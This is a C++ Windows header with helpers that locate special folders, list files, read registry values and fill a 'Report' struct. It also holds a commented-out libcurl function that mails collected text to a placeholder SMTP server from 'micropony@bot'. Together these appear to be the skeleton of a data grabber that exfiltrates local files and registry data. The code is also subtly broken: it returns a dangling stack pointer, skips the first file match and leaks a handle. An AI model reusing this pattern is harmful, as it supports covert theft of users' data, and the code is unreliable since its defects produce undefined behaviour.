#pragma once

#include <windows.h>
#include <Shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>

#include "SimpleIni.h"
#include "curl.h"

struct List
{
	CSimpleIniA::TNamesDepend keys;
	CSimpleIniA::TNamesDepend values;
	CSimpleIniA::TNamesDepend sections;
};

struct Report
{
	std::vector<std::string> paths;
	std::vector<std::string> params;
	std::vector<std::string> values;
};

// get path csidl
char* getPath(int CSIDL)
{
	char szPath[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL, NULL, 0, szPath)))
		return szPath;
	else
		return NULL;
}


std::vector<WIN32_FIND_DATA> grabFile(LPCSTR path)//, LPCSTR namefile)
{
	HANDLE searchFile;
	WIN32_FIND_DATA aa;
	std::vector<WIN32_FIND_DATA> vecFiles;

	searchFile = FindFirstFile(path, &aa);
	while (FindNextFile(searchFile, &aa) != NULL)
		vecFiles.push_back(aa);

	return vecFiles;
}

std::string getKeyValue(HKEY reg, LPCSTR path, LPCSTR param)
{
	DWORD dwType = REG_SZ;
	HKEY rKey;
	char value[1024];
	DWORD value_length = sizeof(value);
	RegOpenKeyEx(reg, path, 0, KEY_QUERY_VALUE, &rKey);
	RegQueryValueEx(rKey, param, NULL, &dwType, (LPBYTE)&value, &value_length);
	RegCloseKey(rKey);

	return std::string(value);
}

/*
int sendMail(std::string text)
{
	CURL *curl;
	CURLcode curl_code;
	//FILE *message;
	//message = fopen(mail_path, "r");
	struct curl_slist *recipients = nullptr; // NULL

	curl = curl_easy_init();
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_USERNAME, "xxx"); // username
		curl_easy_setopt(curl, CURLOPT_PASSWORD, "xxx"); // pass
		curl_easy_setopt(curl, CURLOPT_URL, "yyy:ppp"); // url smtp

		recipients = curl_slist_append(recipients, "ttt"); // to
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "micropony@bot"); // from
		curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
		curl_easy_setopt(curl, CURLOPT_READDATA, text);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

		curl_code = curl_easy_perform(curl);

		curl_slist_free_all(recipients);
		curl_easy_cleanup(curl);
	}

	return curl_code;
}
*/